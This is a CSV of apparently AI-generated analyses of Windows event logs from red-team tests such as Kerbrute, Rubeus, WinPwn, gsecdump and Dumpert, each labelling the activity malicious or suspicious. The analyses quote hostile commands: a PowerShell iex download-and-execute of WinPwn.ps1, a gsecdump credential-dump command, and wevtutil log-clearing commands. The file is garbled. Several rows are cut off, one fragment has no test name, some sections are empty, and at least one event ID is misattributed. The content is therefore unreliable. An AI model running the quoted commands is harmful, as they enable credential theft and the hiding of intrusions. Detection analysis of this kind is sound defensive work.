Directory Name,AI Response
Password Brute User using Kerbrute Tool,"Upon reviewing the provided Windows event logs, several points of interest stand out that suggest potential malicious activity:

1. **PowerShell Activity**:
   - The logs show a PowerShell execution of `kerbrute.exe`, which is primarily used for attacking Kerberos services, specifically performing brute-force attacks on Active Directory accounts. This activity itself is highly suspicious, given its association with unauthorized penetration tests or malicious intent from attackers.

2. **Log Clearing**:
   - The system, security, and PowerShell event logs have been cleared shortly before or after the execution of potentially malicious scripts. The use of `wevtutil.exe` in clearing logs is a known technique used by attackers to cover their tracks, further increasing the suspicion of malicious activity.

3. **User and System Activity**:
   - The action was executed under the user `admin_test`, which indicates the actor had administrative privileges. The frequency and type of executed commands, such as `whoami.exe`, `hostname.exe`, and `rundll32.exe`, align with reconnaissance activities typically performed by attackers.

4. **Sysmon Logs**:
   - Sysmon events reveal the execution of several high-privilege processes including the log clearing utility `wevtutil.exe`, originating from a high-integrity context (`IntegrityLevel: High`). This provides further evidence of an attempt to delete event logs and other system activities that align with malicious behavior.

**Assessment**:
The logs present clear indicators of possible compromise, including the execution of potentially malicious software, the clearing of event logs, execution of reconnaissance commands, and actions performed with elevated privileges. Together, these logs suggest the system might be compromised by an adversary with administrative access.

**Resolution**: MALICIOUS

**Guidance on how to proceed**:
- Immediately isolate the affected system to prevent any further potential spread of malicious activity.
- Conduct a thorough forensic investigation and collect additional evidence from neighboring systems or network logs.
- Audit and potentially reset Active Directory credentials, especially those with high privileges.
- Consider conducting an organization-wide threat hunt to ensure no other systems are compromised.
- Ensure that logs are being securely and systematically collected and monitored to detect similar activities in the future.
- Review security protocols and evaluate the necessity of additional protective measures like advanced endpoint protection or intrusion detection systems."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus (2),"After reviewing the provided Windows event logs, several indicators of suspicious and potentially malicious activities stand out:

1. **Security Log Analysis**:
   - Event ID 1102 in the Security log indicates the security log has been cleared by the user `admin_test`. Log clearing is often a strong indicator of malicious behavior, especially if it happens unexpectedly and not as part of routine maintenance.

2. **Sysmon Log Analysis**:
   - The execution of `whoami.exe`, `conhost.exe`, and `hostname.exe` associated with user `admin_test` shows normal user inquiries but should be followed for any unexpected script executions.
   - Event ID 1 highlighting `wevtutil.exe` being used to clear logs in the `Microsoft-Windows-Sysmon/Operational`, `Application`, and `Security` channels. The use of `wevtutil.exe` to clear logs is indicative of a potential attempt to cover tracks.

3. **Windows PowerShell Log Analysis**:
   - Events show that PowerShell executed a script via `iex(new-object net.webclient).downloadstring()` to download and run a script from an external source: `Invoke-Rubeus.ps1`. This is a clear indication of malicious activity, as it seems to be using PowerShell to execute a script from a possibly malicious repository known for security testing or attacks (`S3cur3Th1sSh1t/PowerSharpPack` on GitHub).
   - `Invoke-Rubeus` is known for credential extraction and attacks related to Kerberos ticketing (kerberoasting), which is often used in active directory attacks for privilege escalation.

4. **Event Times**: 
   - The systemic use of `wevtutil.exe` and other command-line tools appears tightly clustered in time with the execution of the PowerShell script, suggesting a coordinated attempt to perform malicious actions followed by log clearing.

Based on this detailed analysis, the presence of cleared logs, execution of potentially malicious scripts via PowerShell, and use of known attack tools like `Invoke-Rubeus` strongly indicate that the logs contain malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Containment**: Disconnect the affected host from the network to prevent further compromise.
- **Forensic Analysis**: Perform a full forensic analysis of the affected machine to determine further indicators of compromise and understand the extent of the attack.
- **Review Access Logs**: Check other systems for similar indicators and review access logs to understand potential pivot points or further compromised accounts.
- **Credential Reset**: Reset credentials for affected accounts, particularly any accounts that ran the suspicious processes.
- **Update Security Tools**: Ensure all security tools, such as antivirus and intrusion detection systems, are updated with the latest signatures and patterns.
- **Audit and Harden Security Posture**: Conduct a security audit and implement measures to close any vulnerabilities exploited during this incident, such as segregating network access, applying security patches, and increasing monitoring.

Further investigation would be necessary to identify any deeper infiltration and to prevent future occurrences."
Extract all accounts in use as SPN using setspn,"### Analysis of the Windows Event Logs:

1. **Process Execution Patterns:**
   - There is a sequence of events involving the clearing of logs (EventID 1102 from the Security log and EventID 104 from the System log) associated with the user `SERVER002\admin_test`. Log clearing is a rare and sensitive event, typically warranting closer inspection as it can be indicative of malicious activity where an attacker attempts to cover their tracks.
   - The use of `wevtutil.exe` is frequent for clearing various logs, such as the Microsoft-Windows-Sysmon/Operational log, Application, System, and Security logs, which supports the hypothesis of log tampering.

2. **Command Line Arguments:**
   - The `wevtutil.exe` utility is executed multiple times with `cl` (clear) commands, targeting different log channels:
     - `Microsoft-Windows-Sysmon/Operational`
     - `Application`
     - `System`
     - `Security`
   - These actions are executed by the same user, `SERVER002\admin_test`, who later initiates the `cmd.exe` and `setspn.exe` processes, both associated with network queries.

3. **Integrity Levels and User Activity:**
   - The integrity level for processes initialized by `SERVER002\admin_test` is high, indicating administrative privileges. This is typical for systems administrators but also a common feature of compromise scenarios.
   - The regular activity from the `NT AUTHORITY\SYSTEM` user involving `MicrosoftEdgeUpdate.exe` does not appear suspicious as it follows normal update patterns.

4. **Time Change Event:**
   - A series of Time Change events are noted, with EventID 4616 in the Security log and 1 in the System log. Time synchronization events can be benign, but they could also be used in a context to obfuscate activity timestamps.

5. **Potential Indicators of Compromise:**
   - Log deletion is a significant sign of potential compromise, often associated with attempts to delete traces of malicious activities.
   - The synchronization and consistent clearing of critical event logs point toward an attempt to cover unauthorized or hidden activities rather than natural log maintenance.

### Assessment:

The observed activities present strong indicators of potential malicious activity. The repeated clearing of critical operational logs without corresponding documentation or operational need aligns with attacker behavior post-intrusion, specifically indicating possible action-on-objectives stages where an adversary seeks to maintain persistence and evade detection.

### Resolution: **MALICIOUS**

### Guidance on Proceeding:

- Conduct an immediate investigation to verify the legitimacy of the actions performed by `SERVER002\admin_test`. Review any change or admin request logs and cross-reference these events.
- Perform a thorough audit of user actions and potentially affected systems to identify any unauthorized access or changes.
- Strengthen monitoring around critical systems for similar behaviors and ensure tighter controls and more frequent analysis of logs.
- Consider engaging incident response specialists to ensure a thorough forensic analysis and any needed remedial measures to counteract potential ongoing threats."

WinPwn - Snaffler,"Upon reviewing the provided Windows event logs, here are the main observations and findings:

1. **Process Execution:**
   - **PowerShell Execution with Suspicious Script:**
     - A suspicious PowerShell command was executed from the host `Server002` using `powershell.exe`. The command involves downloading and executing a script from a GitHub repository, `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`, which suggests the presence of script execution for potentially malicious activities. The use of obfuscated variable names like `$S3cur3Th1sSh1t_repo` and executing scripts directly from the internet is a common tactic used in attacks.
   - **Event Logs Clearing:**
     - Multiple instances of logs being cleared on different channels, including `Security`, `System`, and `Windows PowerShell`. This is suspicious as attackers often clear logs to remove traces of their activities.
   - **Wevtutil Log Clearing:**
     - Use of `wevtutil.exe` to clear logs is noted, confirming attempts to cover tracks.
   
2. **Privilege Escalation:**
   - The user `admin_test` has leveraged several powerful privileges such as `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, etc. This indicates a potentially elevated privilege context, which can be leveraged for malicious activities.
   
3. **Time Change Events:**
   - Time on the system has been altered, evident from Kernel-General and Security-Auditing logs, which can be another effort to hinder log monitoring or forensic analysis.

4. **Indicators of Compromise (IoC):**
   - The specific PowerShell script executed (`WinPwn.ps1`) is a known post-exploitation framework, typically used for privilege escalation, credential dumping, and other post-exploitation activities.
   
5. **Other Observations:**
   - Multiple executions of `whoami.exe`, `hostname.exe`, and similar utilities suggest potential reconnaissance activities.
   - Edge Update events appear normal and consistent with software update processes.

**Assessment and Recommendation:**
The logs present evidence of several potential security risks associated with the system `Server002`. Execution of a potentially malicious PowerShell script, intentional log clearing, and time manipulation are strong indicators of a compromised system with attempts to hide malicious activities.

These steps will help in understanding the full extent of the compromise and addressing immediate threats."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"After analyzing the provided logs, here is the detailed assessment:

### Indicators of Malicious Activity:

1. **Clearing Event Logs:**
   - From the Security log, Event ID 1102 indicates that the security log was cleared by a user with the username ""admin_test.""
   - From the System log, Event ID 104 shows that ""admin_test"" also cleared the system and PowerShell logs shortly before the security log was cleared.

2. **Suspicious Commands and Processes:**
   - Multiple Sysmon events indicate the use of `wevtutil.exe` to clear logs (`cl` command), executed by the ""admin_test"" account. This includes clearing `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs.
   - Use of PowerShell to execute a command - `appcmd.exe list apppool /config`. While this command itself is legitimate, the context of execution (following the clearing of logs) raises suspicion.

3. **Account Activity:**
   - The ""admin_test"" account is heavily involved in questionable activities, including clearing logs and executing suspicious PowerShell scripts, which can be indicative of an attempt to cover tracks on the system.

### Conclusion:
The combination of log clearing with the execution of PowerShell scripts and command-line utilities by the ""admin_test"" user suggests an attempt to hide potentially unauthorized activities on the system. The behavior observed aligns with common tactics used in malicious activities, specifically attempts at covering tracks following a compromise.

### Resolution:
- **MALICIOUS** - The logs indicate activities that match patterns typical of malicious actions, such as log clearing and the execution of potentially suspicious commands using administrative privileges.

### Recommended Actions:
1. **Immediate Investigation:**
   - Suspend the ""admin_test"" account's access and review user privileges.
   - Conduct a forensic investigation of the system to identify further evidence of compromise.
   
2. **Audit and Logging:**

   - Ensure regular backups and conduct security awareness training if necessary. 

4. **Review Security Policies:**
   - Review user access policies and implement stricter controls to prevent unauthorized administrative actions."
Simulating access to Chrome Login Data,"Upon reviewing the provided Windows event logs, several indicators point toward potentially malicious activity. Here is the detailed analysis:

1. **Log Clearing Activities:**
   - The clearance of event logs is documented in the System and Security logs (`EventID 104` for System, `EventID 1102` for Security). Both events are executed by a user account named ""admin_test"". Clearing logs is often an attempt to hide tracks and is commonly seen in post-exploitation activity.

2. **Suspicious PowerShell Activity:**
   - Windows PowerShell logs show sequences of PowerShell command executions involving the `Copy-Item` command targeting sensitive Chrome user data (`Login Data`) with a destination in a temp directory. This is an indicator of potential data exfiltration or credential access (`EventID 600` in the PowerShell logs).

3. **Potential Credential Dumping:**
   - The copying of Chrome's login data might suggest attempts to capture credentials stored in the browser. Coupled with the log-clearing activities, it presents a scenario of stealthy data extraction.

4. **Sysmon Process Creation Events:**
   - The Sysmon logs outline a pattern of processes involving PowerShell and the `wevtutil` command used to clear logs. It further corroborates the suspicious activity orchestrated through the ""admin_test"" account executing high-integrity level processes (`EventID 1` in the Sysmon logs).

5. **Analysis of Security Events:**
   - The presence of events such as `EventID 5379` (failure to read certain credential elements) could potentially relate to unauthorized or failed attempts to access credential information.

6. **Other Processes:**
   - While some processes, such as `SecureBootEncodeUEFI.exe`, `taskhostw.exe`, and others executed by SYSTEM account, appear otherwise benign and routine, they coincide closely with the timeframe of suspicious PowerShell and wevtutil activities, indicating the system was active and possibly under scrutiny.

### Final Assessment

Given the combination of command-line activity indicating potential data access/exfiltration, the presence of log-clearing events, the credentials copy activities, and potential identity obfuscation, the evidence strongly suggests malicious behavior.

### Resolution: MALICIOUS

**Guidance on How to Proceed:**
- Immediately isolate the affected host (Server002) to prevent further data exfiltration and shield the rest of the network.
- Conduct a thorough review of user accounts, particularly ""admin_test,"" to understand any unauthorized access or lateral movement.
- Examine the temp directories for any malicious artifacts or copied data.
- Review network logs or deploy packet capture tools to catch any outgoing suspicious traffic.
- Conduct a wider investigation on systems associated with the ""admin_test"" account or that share similar logs.
- Post-incident actions include auditing and reinforcing security policies, especially around PowerShell execution and critical log monitoring.

This assessment substantiates a potential compromise of security using PowerShell scripts and unauthorized cleanup of logs to obfuscate malicious actions."
Create Volume Shadow Copy with vssadmin,"### Detailed Analysis

The log entries provided contain events from the Security, Application, System, Windows PowerShell, and Sysmon logs. Here's an in-depth analysis of potential suspicious activities:

#### Security Log
- **Event ID 1102**: Indicates that the audit log was cleared by the user `admin_test`. Log clearing is generally suspicious as it may suggest an attempt to hide malicious activity. The process ID `5368` and start time are significant and should be investigated further.

#### Application Log
- **Event ID 15 (SecurityCenter)**: Shows that Windows Defender is operational. This is generally benign and indicates that antivirus protection is active on the system.

#### System Log
- **Event IDs 104**: These indicate that system logs in different channels (System, Windows PowerShell) were cleared by `admin_test`. Clearing logs is an unusual and suspicious activity as it could be an attempt to cover unauthorized or malicious actions.

#### Sysmon Log
- **Sysmon Events**: We observe a sequence of typical Windows processes such as `cmd.exe`, `conhost.exe`, and `reg.exe`. The use of `cmd.exe` to execute commands like querying the registry and using `findstr` is standard administrative or diagnostic behavior. However, creating shadow copies via `vssadmin.exe` (`cmd.exe`/ `vssadmin.exe create shadow /for=C:`) is indicative of potential ransomware behavior or backup circumvention.
  
- **Event Clearing with `wevtutil`**: Multiple instances of `wevtutil.exe` clearing logs (`cl`) for Sysmon, Application, System, and Security logs suggest an effort to erase the trail of activity, which is highly suspicious.

#### Main Points of Concern:
1. **Log Clearing**: Multiple logs being cleared, especially within a short timeframe, is a notable red flag, particularly when performed by `admin_test` using `wevtutil.exe`.
2. **Use of `vssadmin.exe`**: This command is often associated with ransomware attempts as they may create shadow copies to back up files prior to encryption or remove them to prevent recovery.
3. **Administrative Commands Without Clear Justification**: Though some registry queries and string searching can be routine, combined with log clearing, they can indicate privilege escalation or reconnaissance.

### Assessment
Based on the analysis, the activities recorded in the logs indicate suspicious behavior, particularly due to the multiple instances of log clearing and the use of `vssadmin.exe`. However, they are not necessarily immediately malicious without further context, such as direct file or system compromise. The logs warrant additional investigation to understand the intent behind these actions.

### Resolution
**SUSPICIOUS**

### Recommendations for Further Action
1. **Investigate User Activity**: Review activities associated with `admin_test` and the duration these actions took place. Verify if actions were authorized.
2. **Check for Known Threats**: Cross-reference the actions with known ransomware or malicious toolkits.
3. **Forensic Analysis**: Consider deeper forensic analysis of the system to determine if any unauthorized modifications were made or if there are any residual artifacts indicating malicious compromise.
4. **Mitigation Steps**: Implement stricter logging and alerting for actions such as log clearing, and apply role-based access controls to minimize unnecessary privileges for user accounts.
5. **Review System Security**: Ensure all systems have up-to-date security patches and that Windows Defender has no detections correlating with this timeframe.

This analysis concludes with a need for heightened awareness and additional investigative efforts into the cause and intent behind these suspicious events."

2. **Privileged Operations**:
   - Event 4672 indicates that an account was granted special privileges, including SeDebugPrivilege, which allows programs to attach to and manipulate the memory of application processes. Granting of this privilege is often abused by malware for privilege escalation.
   - Event 4624 represents a system-level logon by the SYSTEM user via the Advapi process, often seen when services start under SYSTEM or when malware misuses API to operate under elevated privileges.

3. **Anomalous Process Executions**:
   - Sysmon logs show command executions that are typically indicative of malicious operations:
     - An attempted execution of ""Invoke-AtomicTest T1003.003"" to create a Volume Shadow Copy with `vssadmin` is logged. This test aligns with techniques used for credential access.
     - Multiple instances of the `wevtutil.exe` utility being used to clear or manipulate log files (EventID: 1 across multiple records).
     - Specific attention to Event 17983, where `cmd.exe` executes commands to copy NTDS and SYSTEM hive files – an indicative attempt at data exfiltration or credential dumping (NTDS.dit and SYSTEM registry).

4. **Time Manipulation**:
   - Multiple Event ID 4616 indicate system time adjustments, potentially trying to manipulate timestamps to disrupt forensic analysis or correlate logs with actual events.

5. **Failed Credential Operations**:
   - Several EventID 5379 instances indicate attempts to access MicrosoftAccount tokens that failed, noted by the error code 3221226021.

Given these points, the activities observed in the logs align with known attack vectors often leveraged in sophisticated attacks on Windows systems. This includes attempts to escalate privileges, conceal tracks by log clearing, and potential data exfiltration.

**Assessment**: 
- **MALICIOUS**: The logs clearly demonstrate malicious intent with execution of commands aimed at data theft and log manipulation. 

**Guidance**:
- Isolate the affected host to prevent potential lateral movement.
- Conduct a detailed forensic investigation to assess the full impact.
- Review and implement additional security measures such as logging improvements and enhanced monitoring.

Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon careful examination of the provided Windows event logs, several suspicious activities are observed:

1. **Log File Clearing Events**:
   - System log indicates clearing activities in quick succession for system, PowerShell, and Security logs by the user `admin_test`.
   - Event ID 104 in the System log and Event ID 1102 in the Security log both reflect that logs have been cleared. This behavior is generally indicative of attempts to cover tracks after some malicious activities.

2. **Process Creation with Suspicious Command Lines**:
   - Multiple instances of `wevtutil.exe` with the `cl` (clear) command suggest logs were cleared directly using this executable. This includes channels such as Microsoft-Windows-Sysmon/Operational, Application, System, and Security.
   - Sysmon logs capture `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\Outflank-Dumpert.exe`, which is a known post-exploitation tool used to dump credentials from the Local Security Authority Subsystem Service (LSASS) without creating detection artifacts.

3. **Execution of Reconnaissance and Utility Tools**:
   - `whoami.exe`, `hostname.exe`, `cmd.exe` are executed with specific command lines, often seen in enumeration or initial staging of malicious payloads.

4. **High-Level Privileges and Security Token Manipulation**:
   - Event ID 4672 shows that the SYSTEM user has used a host of high-level privileges, which may indicate privilege escalation or an attempt to exploit these privileges for malicious intent.

Given the presence of:
- Log clearing activities to cover tracks.
- Use of potentially malicious tools (e.g., ""Outflank-Dumpert.exe"") associated with credential dumping.
- Execution of associated reconnaissance and command-line utilities, coupled with elevated privileges.
- Anomalies pointing towards actions typically avoided by benign operations to retain logs for auditing.

The events present in the logs point to a high probability of malicious activity. Attempts to erase tracks by clearing log files, particularly involving important security, system, and application channels, strengthen the inference.

**Assessment**: MALICIOUS

**Guidance**:
- Immediately conduct a detailed forensic investigation on Server002.
- Identify any unauthorized access and contain the threat to prevent further damage.
- Review and enhance logging and monitoring strategies.
- Consider using endpoint detection and response (EDR) solutions to track suspicious activities in real-time.
- Perform a security audit and apply appropriate security patches and policies to mitigate future risks."
Gsecdump,"Upon analyzing the provided logs, several suspicious activities raise concerns about potential malicious intent:

1. **Log Clearing Activity:**
   - There are multiple events indicating that log files have been cleared. System Event ID 104 and Security Event ID 1102 show that logs in the System, Windows PowerShell, and Security channels were cleared by a user with the username `admin_test` on `Server002`. Log clearing is a common tactic used by attackers to cover their tracks after compromising a system.

2. **Use of `wevtutil.exe`:**
   - The events show multiple instances of `wevtutil.exe` (the Windows Event Utility) being executed, with commands to clear various logs (e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). This action directly corresponds with the log clearing activity seen in other events.

3. **Execution of `gsecdump.exe`:**
   - A potentially suspicious command was executed: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\gsecdump.exe"" -a`. The use of `gsecdump.exe`, a tool known for extracting credentials like hashes from the Security Account Manager (SAM) database in Windows, indicates an attempt to elevate access or extract credentials.

Based on these findings, there is substantial evidence suggesting malicious activity:

- The combination of log clearing and the use of a tool for credential dumping is a strong indicator of a compromise.
- The presence of the `gsecdump.exe` tool, especially when executed from a temporary directory, further supports the likelihood of unauthorized access or activity.
- The `admin_test` account, while it could be a legitimate test account, is highly suspect as the source for these actions, especially because such accounts can often be targeted by attackers or used for legitimate but potentially unsafe testing.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- **Immediate Incident Response:**
  - Isolate the affected system (`Server002`) to prevent potential lateral movement.
  - Conduct a thorough investigation of user account activities, especially around `admin_test`, to determine if it has been compromised or misused.
  - Review and enhance logging and monitoring configurations to detect similar activities in the future.
  
- **System Recovery and Forensics:**
  - Perform a full forensic analysis on the affected system to determine the impact and extent of the breach.
  - Restore the system from a known good backup prior to the suspicious activities.
  - Identify and mitigate any vulnerabilities or security gaps that might have been exploited.

- **Preventive Measures and Lessons Learned:**
  - Implement stricter access controls, including the use of multifactor authentication for administrative accounts.
  - Regularly review and audit user accounts and privileges in alignment with the principle of least privilege.
  - Conduct security awareness training focused on recognizing and reporting suspicious activities."
Brute Force Credentials of single Active Directory domain users via SMB,"In analyzing the provided Windows event logs, a few points stand out as potential indicators of malicious activity:

1. **Event Logs Clearing**:
   - There are multiple events indicating that logs were cleared. Specifically, the following events are noteworthy:
     - **System Log** (Event ID 104) indicates that both the System and Windows PowerShell logs were cleared by the user ""admin_test"".
     - **Security Log** (Event ID 1102) directly shows the clearing of security logs done by the user ""admin_test"".
   - The clearing of logs is a classic tactic used by attackers to cover their tracks, and it is highly suspicious when coupled with other potential indicators of compromise.

2. **Suspicious Command-Line Activity**:
   - In the **Sysmon Log**, event record ID 17980 logs execution of `cmd.exe` with a command line argument that tries multiple passwords including ""Password1"", ""1q2w3e4r"", and others to attempt connections to the user's IPC$ share. This behavior is indicative of a password guessing attack or brute force attempt.

3. **High Privilege Levels**:
   - Activities are executed under the ""admin_test"" account with high privileges, including clearing logs and potentially executing malicious scripts. The account has privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which, if misused, can lead to privilege escalation or comprehensive system access.

4. **Series of Process Executions**:
   - Multiple instances of `wevtutil.exe` (a utility to manage Windows event logs) were executed under the ""admin_test"" account, indicating repeated clearing or manipulation of event logs: 
     - `wevtutil.exe` commands clear the logs for Application, System, Windows PowerShell, and Security event logs.
   - The pattern of using `wevtutil.exe` by an admin account in this manner further adds to the suspicion.

5. **Use of Common Admin Utilities**:
   - Executions of `whoami.exe`, `hostname.exe`, and `net.exe` under the ""admin_test"" account are observed. While these could be legitimate, combined with the context of other suspicious activities, they may indicate reconnaissance or lateral movement by an attacker.

6. **Evidence of Software Update Activity**:
   - Multiple activities related to Microsoft Edge Update can be seen. While they seem to be legitimate processes (e.g., updating Microsoft Edge), they cover a large portion of the logs but do not directly appear malicious based on the descriptions and typical software update behavior.

**Assessment and Resolution**:
- **SUSPICIOUS**: The logs contain several indicators that warrant further investigation, such as log clearing, suspicious script execution, and high privilege operations. While some activities could potentially be benign if explained by a legitimate system maintenance or admin action, the combination and context in which they occur (e.g., attempted password brute force) suggest an anomaly.

**Guidance**:
- Investigate the ""admin_test"" account for any unauthorized access or signs of a compromised account.
- Conduct a detailed review of other security logs or alerts around the same time frame to corroborate potential malicious activity.

- Conduct a file integrity check and consider conducting an endpoint threat detection or forensic investigation to ensure no backdoors or persistent threats are present on the host."
WinPwn - DomainPasswordSpray Attacks,"**Detailed Analysis of Logs:**

**1. Security Log Analysis:**
- **Log Clearing Event:** Event ID 1102 indicates that the security log was cleared by the user `admin_test`. Clearing event logs, especially the security log, is typically suspicious as it may indicate an attempt to hide malicious activity. 
- **Time Change Event:** Event ID 4616 shows a time change event initiated by `LOCAL SERVICE` with `ProcessName` set to `svchost.exe`. While time change events can be legitimate system activities, in conjunction with other suspicious activities, they might be used to modify timestamps in logs.

**2. Sysmon Log Analysis:**
- **Process Execution and Log Clearing:**
  - **Wevtutil Commands:** Multiple instances of `wevtutil.exe` being executed with the command line arguments to clear logs (`cl`). Specifically, `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `System` logs were cleared.
  - The execution instances of `wevtutil.exe` are all linked to the user `SERVER002\admin_test` showing that the command to clear logs was run multiple times to target different log channels.
- **PowerShell Script Execution:** There's a suspicious PowerShell execution in the Sysmon logs:
  - Command-line argument downloading a script (`WinPwn.ps1`) from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`) and executing it within PowerShell using `iex(new-object net.webclient).downloadstring(...)`.
  - Use of `domainpassspray` suggests it might be testing weak passwords against domain accounts, indicative of potential lateral movement or foothold establishment in a network.

**3. Application Log Analysis:**
- **Windows Defender is Enabled:** Multiple entries confirming that Windows Defender was active during the event timeframe. This typically doesn't indicate malicious activity directly but is important to note for full context.

**4. System Log Analysis:**
- **Log Clearing Events:**
  - Similar to the Security Log, entries with Event ID 104 confirm that the system log was cleared by the same user `admin_test`.

**5. Windows PowerShell Log Analysis:**
- **Execution of Potentially Malicious Script:** It echoes what was seen in the Sysmon logs regarding the execution of a potentially malicious script from a remote repository.

**Assessment and Conclusion:**
- **Indicators of Malicious Activity:** The logs reveal multiple indicators of suspicious activity, including:
  - Repeated clearing of logs (Security, System, and Sysmon logs) using `wevtutil.exe`.
  - Execution of a PowerShell script from a remote repository (`WinPwn.ps1`), likely used for potentially malicious purposes such as credential spraying.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately isolate the affected host (`Server002`) from the network to prevent further unauthorized activities.
- Conduct a full malware scan and forensics analysis on `Server002` to ascertain any unauthorized changes or backdoors.
- Review and modify access permissions of the user account `admin_test` and investigate other systems for unauthorized scripts or tools.
- Implement network-wide monitoring for similar behavior across other systems to prevent similar compromises.
- Reconstruct the event logs from any existing backups if necessary for further analysis and incident reporting."
WinPwn - Kerberoasting,"From the provided series of Windows event logs, several key entries point towards suspicious and potentially malicious activities:

1. **Execution of Powershell with Malicious Intent**:
   - The logs show a process with the path `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with the command line that appears to execute a script from an external repository: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`. This is a clear indication of a PowerShell script being executed to fetch and run potentially harmful content.

2. **Kerberoasting Activity**:
   - The PowerShell log indicates a Kerberoasting attack, a common technique used to extract service account credentials in a Windows environment. This further solidifies the presence of malicious activities, intending to elevate privileges.

3. **Event Log Clearing**:

WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"### Detailed Analysis of the Logs

Upon examining the provided Windows event logs, the following points of interest and anomalies were identified:

1. **Unusual PowerShell Activity:**
   - Multiple Sysmon Event ID 1 entries show execution of `powershell.exe` with a command line that downloads and executes a script from an external URL. This specific command uses `Invoke-Rubeus` which is commonly associated with Kerberos attack tools such as password extraction and ticket requests.
   - The PowerShell logs (Event ID 600) also show this command being executed which confirms that it was run within a PowerShell context.

2. **Event Log Clearing:**
   - The Security log shows a Sysmon Event ID 1102 (LogFileCleared) indicating that the security log was cleared by a user with the `admin_test` account. This is often done by malicious actors to cover their tracks.

3. **Command-line Event Log Clearing:**
   - Event logs related to Windows Event logging (Sysmon events tied to `wevtutil.exe` usage) show that the command-specific clearing of event logs took place which implies an attempt to remove traces of activities.

4. **Invocation of `whoami` and `hostname`:**
   - While these could be benign, the execution context and their association with other potentially malicious indicators may suggest they were used to gather system information during the attack.

5. **Suspicious Time Change Events:**
   - Multiple Security and System Log entries showing time change events. Synchronization via `svchost.exe` that possess non-standard date jumps. This could suggest potential tampering with system time possibly to align other actions or evade detection.

WinPwn - BrowserPwn,"Upon examining the provided logs, several suspicious activities were identified that suggest potential malicious behavior:

1. **Clearing of Event Logs**:
   - The events include log clearance operations captured in both the Security and System logs. For instance, Event ID 1102 in the Security log and Event ID 104 in the System log show that the event logs were cleared using the `wevtutil` command.
   - These actions were performed by the user `SERVER002\admin_test`, which could be an attempt to erase traces that might reveal unauthorized activities. This behavior is commonly associated with covering tracks post-compromise.

2. **Sysmon Logs Indicate Command Usage**:
   - Multiple instances of `wevtutil.exe` usage to clear logs are observed (Sysmon Event ID 1), specifically targeting the ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""Security"", and ""System"" channels.
   - This usage of `wevtutil.exe` for clearing logs by a user with high integrity level privileges (`SERVER002\admin_test`) further strengthens the possibility of malicious intent.

3. **Execution of Suspicious PowerShell Script**:
   - There is a crucial event in the Sysmon logs where a PowerShell script was executed directly from a GitHub URL, detailed in the PowerShell and Sysmon logs.
   - The command line used invokes PowerShell to download and execute contents from the URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1`, which appears to be an unauthorized script being executed.
   - Download and execution of scripts from the internet without verification are often indicative of malicious actions or attempts to execute unauthorized scripts.

4. **Process Execution**:
   - The Sysmon logs indicate that processes such as `hostname.exe` and `whoami.exe` were executed, followed by clearing of certain event logs. These are typical reconnaissance actions performed by attackers to gather system information before further attacks.

5. **Adjustments to Time**:
   - There are multiple entries adjusting the system time (Event ID 4616 in the Security log). While not inherently malicious, frequent time adjustments can be used in conjunction with log clearance to mislead forensic analysis.

### Assessment:
Based on this analysis, the actions observed in these logs are indicative of someone attempting to cover their tracks after potentially malicious activities. The combination of event log clearance, remote script execution, and typical reconnaissance activity through specific executable can be considered as malicious behavior. 

### Recommended Actions:
- Conduct a thorough investigation around the user `admin_test` and the specific activities tied to their credentials.
- Validate the source and intentions of the downloaded PowerShell script.
- Review system configurations, firewall settings, and any potential network connections initiated by these scripts.
- Ensure that proper controls and monitoring are in place to detect and prevent any unauthorized clearance of event logs in the future.
- Consider incident response procedures and potentially notify law enforcement or cybersecurity response teams if indications of compromise are confirmed.

**Resolution: MALICIOUS**"
Stage Popular Credential Files for Exfiltration,"Upon reviewing the provided Windows event logs, I've identified several indicators of potentially malicious activity. Here's a detailed analysis:

1. **Log Clearing Events:**
   - There are multiple instances of log-clearing activities noted in both the Security and System logs (`EventID 1102` and `EventID 104` respectively). The `admin_test` user appears to be responsible for these actions. Clearing of event logs can be a sign of malicious activity aimed at covering tracks.

2. **Unusual Privileges Granted:**
   - The `admin_test` user was assigned a series of high-level privileges (`EventID 4672`), including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. This is unusual and could indicate malicious intent, particularly if such elevation is unnecessary for regular operations.

3. **Suspicious Command Execution:**
   - The Sysmon log entries indicate a suspicious execution of the `wevtutil.exe` tool with the `cl` (clear log) command on multiple logs (`Security`, `System`, `Application`, `Windows PowerShell`). This further suggests attempts to delete evidence of previous activities.
   - The command involving `powershell.exe`, seen in both Sysmon and PowerShell logs, is highly suspicious. It appears designed to exfiltrate credential information from browsers like Firefox, Chrome, Opera, and Edge. This is indicative of a credential theft attempt.

4. **Credential Harvesting via PowerShell:**
   - The detailed PowerShell command execution attempts to access and copy credential databases from various browsers, which strongly suggests credential harvesting activities (`EventID 17982`).

5. **Process Association:**
   - The processes like `wevtutil.exe` clearing logs, frequent privilege escalation events, and high integrity level process executions of PowerShell scripts further substantiate that administrative rights were misused.

Given these findings, the pattern of:
